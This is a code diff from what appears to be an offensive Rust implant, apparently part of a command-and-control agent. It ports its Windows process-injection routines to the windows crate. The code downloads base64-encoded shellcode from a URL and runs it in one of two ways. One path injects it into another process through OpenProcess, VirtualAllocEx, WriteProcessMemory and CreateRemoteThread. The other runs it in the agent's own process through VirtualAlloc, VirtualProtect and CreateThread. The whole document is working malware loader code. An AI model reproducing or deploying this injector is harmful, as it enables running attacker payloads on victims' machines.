@@ -1,28 +1,41 @@
 use std::error::Error;
+use litcrypt::lc;
+use base64::decode as b64_decode;
+use reqwest::Client;
 use crate::logger::{Logger, log_out};
 use crate::cmd::{CommandArgs, notion_out};
-use litcrypt::lc;
-
-use base64::decode as b64_decode;
-#[cfg(windows)] extern crate winapi;
-#[cfg(windows)] extern crate kernel32;
-#[cfg(windows)] use winapi::um::winnt::{
-    PROCESS_ALL_ACCESS,
-    MEM_COMMIT,
-    MEM_RESERVE,
-    PAGE_EXECUTE_READWRITE,
-    PAGE_EXECUTE_READ,
-    PAGE_READWRITE,
-    PVOID
-};
-#[cfg(windows)] use winapi::um::{
-    //errhandlingapi,
-    processthreadsapi,
-    winbase, 
-    synchapi::WaitForSingleObject
+#[cfg(windows)] use windows::Win32:: {
+    Foundation::{
+        CloseHandle,
+        GetLastError,
+        BOOL, 
+    },
+    System::{
+        Memory::{
+            VirtualAlloc,
+            VirtualAllocEx, 
+            VirtualProtect, 
+            PAGE_PROTECTION_FLAGS,
+            MEM_COMMIT,
+            MEM_RESERVE,
+            PAGE_READWRITE,
+            PAGE_EXECUTE_READ,
+            PAGE_EXECUTE_READWRITE
+        },
+        Threading::{
+            OpenProcess,
+            CreateThread,
+            CreateRemoteThread,
+            WaitForSingleObject,
+            THREAD_CREATION_FLAGS,
+            PROCESS_ALL_ACCESS
+        },
+        Diagnostics::Debug::WriteProcessMemory,
+        WindowsProgramming::INFINITE
+    },
 };
 #[cfg(windows)] use std::ptr;
-use reqwest::Client;
+#[cfg(windows)] use core::ffi::c_void; 
 
 async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
     logger.debug(log_out!("Starting shellcode debug"));
@@ -184,12 +197,12 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                             // Big thanks to trickster0
                             // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                             unsafe {
-                                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                                let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+                                let addr = VirtualAllocEx(h, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                                 let mut n = 0;
-                                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
-                                kernel32::CloseHandle(h);
+                                WriteProcessMemory(&h, addr, shellcode.as_ptr() as  _, shellcode.len(), &mut n);
+                                let _h_thread = CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
+                                CloseHandle(&h);
                             }
                             return notion_out!("Injection completed!");
                         } else {
@@ -206,8 +219,6 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 };
             },
             "self"  => {
-                type DWORD = u32;
-
                 // Get shellcode
                 let mut shellcode: Vec<u8>; 
                 match get_shellcode(url, b64_iterations, logger).await {
@@ -217,9 +228,10 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
                 logger.debug(log_out!("Injecting into current process..."));
                 unsafe {
-                    let base_addr = kernel32::VirtualAlloc(
+
+                    let base_addr = VirtualAlloc(
                         ptr::null_mut(),
-                        shellcode.len().try_into().unwrap(),
+                        shellcode.len(),
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_READWRITE,
                     );
@@ -238,17 +250,17 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
                     logger.debug(log_out!("Changing mem protections to RX..."));
 
-                    let mut old_protect: DWORD = PAGE_READWRITE;
+                    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
 
-                    let mem_protect = kernel32::VirtualProtect(
+                    let mem_protect: BOOL = VirtualProtect(
                         base_addr,
-                        shellcode.len() as u64,
+                        shellcode.len(),
                         PAGE_EXECUTE_READ,
                         &mut old_protect,
                     );
+        
 
-                    if mem_protect == 0 {
-                        //let error = errhandlingapi::GetLastError();
+                    if mem_protect.0 == 0 {
                         return notion_out!("Error during injection");
                     }
 
@@ -256,19 +268,18 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     logger.debug(log_out!("Calling CreateThread..."));
 
                     let mut tid = 0;
-                    let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
+                    let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };
 
-                    let h_thread = processthreadsapi::CreateThread(
+                    let h_thread = CreateThread(
                         ptr::null_mut(),
                         0,
                         Some(ep),
                         ptr::null_mut(),
-                        0,
+                        THREAD_CREATION_FLAGS(0),
                         &mut tid,
                     );
 
-                    if h_thread.is_null() {
-                        //let error = unsafe { errhandlingapi::GetLastError() };
+                    if h_thread.is_invalid() {
                         logger.err(log_out!("Error during inject."));
                     } else {
                         logger.info(log_out!("Thread Id: ", &tid.to_string()));
